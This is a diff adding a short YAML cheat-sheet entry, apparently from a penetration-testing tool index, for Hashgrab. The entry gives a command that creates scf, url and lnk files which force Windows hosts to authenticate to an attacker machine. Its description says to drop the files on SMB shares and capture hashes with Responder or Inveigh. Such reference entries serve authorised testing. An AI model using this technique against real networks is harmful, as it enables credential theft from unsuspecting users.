@@ -1,0 +1,14 @@
+name: Hashgrab
+description: generate payloads that force authentication against an attacker machine
+commands:
+  - command: python3 /opt/hashgrab/hashgrab.py $IP PrivateDocuments
+    description: Create scf, url & lnk payloads, place them on any smb share and run Responder or Inveigh.
+tags:
+  - enumeration
+  - smb
+show:
+links:
+  - inveigh
+  - responder
+references:
+  - https://github.com/xct/hashgrab
